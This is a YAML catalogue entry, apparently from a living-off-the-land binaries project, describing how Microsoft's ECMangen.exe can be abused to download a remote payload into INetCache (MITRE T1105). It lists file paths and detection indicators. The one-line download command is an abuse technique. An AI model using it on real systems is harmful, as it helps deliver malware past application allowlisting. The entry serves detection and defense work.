---
Name: ECMangen.exe
Description: Command-line tool for managing certificates in Microsoft Exchange Server.
Author: Avihay Eldad
Created: 2024-04-30
Commands:
  - Command: ECMangen.exe {REMOTEURL}
    Description: Downloads payload from remote server
    Usecase: It will download a remote payload and place it in INetCache
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
    Tags:
      - Download: INetCache
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe
  - Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe
  - Path: C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe
  - Path: C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe
  - Path: C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe
  - Path: C:\ExchangeServer\Bin\ECMangen.exe
Detection:
  - IOC: URL on a ECMangen command line
  - IOC: ECMangen making unexpected network connections or DNS requests
Acknowledgement:
  - Person: Avihay Eldad
    Handle: '@AvihayEldad'
---
